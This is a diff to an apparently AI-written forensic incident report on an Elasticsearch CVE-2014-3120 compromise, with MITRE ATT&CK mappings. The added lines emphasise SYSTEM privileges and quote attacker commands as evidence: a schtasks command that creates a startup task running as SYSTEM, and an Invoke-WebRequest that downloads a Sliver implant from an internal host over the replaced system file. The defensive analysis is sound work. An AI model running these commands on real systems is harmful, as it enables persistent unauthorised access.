@@ -418,11 +418,13 @@ Based on the forensic analysis of the Sysmon logs and system artifacts, I've rec
 1. **Elasticsearch Vulnerability Exploitation** [T1190, T1133]
    - The attacker exploited a critical vulnerability (CVE-2014-3120) in Elasticsearch 1.1.1
    - Commands were executed directly through the Elasticsearch service process
+   - Elasticsearch was running with NT AUTHORITY\SYSTEM privileges, giving the attacker immediate system-level access
    - Evidence: Sysmon logs showing command execution from `elasticsearch-service-x64.exe`
 
 2. **PowerShell Command Execution** [T1059.001, T1027]
    - Base64-encoded PowerShell commands were executed to evade detection
    - Complex malicious commands were run while bypassing security controls
+   - Commands executed with NT AUTHORITY\SYSTEM privileges inherited from the Elasticsearch service
    - Evidence: Multiple encoded PowerShell execution events in Sysmon logs
 
 3. **System Information Gathering** [T1082, T1087]
@@ -437,13 +439,15 @@ Based on the forensic analysis of the Sysmon logs and system artifacts, I've rec
 
 5. **Scheduled Task Creation** [T1053.005, T1543.003]
    - Created scheduled task "updates" to run at system startup
-   - Configured to execute with SYSTEM privileges for maximum access
-   - Evidence: `schtasks /create /tn "updates" /tr $BINARY /ru 'SYSTEM' /sc onstart`
+   - Explicitly configured to execute with NT AUTHORITY\SYSTEM privileges for maximum access
+   - Task creation was performed with elevated privileges inherited from the Elasticsearch service
+   - Evidence: `schtasks /create /tn "updates" /tr $BINARY /ru 'SYSTEM' /sc onstart /rl highest`
 
 6. **Masquerading as System File** [T1036.003, T1036.005]
-   - Replaced legitimate `C:\Windows\System32\update.exe` with malware
+   - Downloaded and replaced legitimate `C:\Windows\System32\update.exe` with malware
+   - Download operation was performed with NT AUTHORITY\SYSTEM privileges, allowing modification of protected system files
    - Maintained same filename and location to avoid detection
-   - Evidence: PowerShell command showing file replacement
+   - Evidence: PowerShell command showing file replacement: `Invoke-WebRequest -Uri "http://192.168.1.107:8000/update.exe" -OutFile $BINARY`
 
 7. **Sliver C2 Framework** [T1105, T1071]
    - Malicious update.exe was a Sliver C2 framework implant
@@ -451,9 +455,10 @@ Based on the forensic analysis of the Sysmon logs and system artifacts, I've rec
    - Evidence: VirusTotal analysis confirming C2 communication
 
 8. **SYSTEM Level Execution** [T1548, T1134]
-   - Scheduled task ran malware with SYSTEM privileges
+   - Scheduled task ran malware with NT AUTHORITY\SYSTEM privileges
    - Highest possible local permissions on the Windows system
-   - Evidence: `/ru 'SYSTEM'` parameter in scheduled task creation
+   - The entire attack chain maintained SYSTEM privileges from initial access through execution
+   - Evidence: `/ru 'SYSTEM'` parameter in scheduled task creation and `/rl highest` for highest privilege level
 
 9. **Remote Desktop Protocol** [T1021.001]
    - Configured RDP access via "Remote Desktop Users" group membership
